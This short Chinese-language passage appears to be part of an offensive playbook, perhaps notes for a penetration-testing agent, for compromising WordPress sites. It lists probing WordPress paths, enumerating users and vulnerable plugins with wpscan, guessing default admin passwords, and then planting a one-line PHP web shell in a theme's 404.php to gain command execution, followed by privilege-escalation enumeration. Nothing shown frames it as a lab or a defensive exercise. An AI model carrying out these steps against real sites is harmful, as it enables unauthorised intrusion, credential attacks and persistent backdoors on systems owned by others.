...
**WordPress 专项**
- 目标开放 80 端口时，优先探测 `/wp-login.php`、`/wp-admin`、`/wp-json/wp/v2/users` 确认是否为 WordPress
- 确认 WordPress 后，依次执行：
  1. `wpscan --url <target> --enumerate u,vp --no-update` — 用户枚举 + 插件漏洞
  2. 弱密码尝试：admin/admin, admin/password, admin/qwerty, admin/wordpress
  3. 登录成功后 → 外观 → 主题编辑器 → 404.php → 写入 `<?php system($_GET['cmd']); ?>`
  4. 访问 `http://<target>/wp-content/themes/<theme>/404.php?cmd=id` 验证 RCE
- 获得 www-data shell 后立即枚举提权路径（SUID、sudo -l、内核版本）
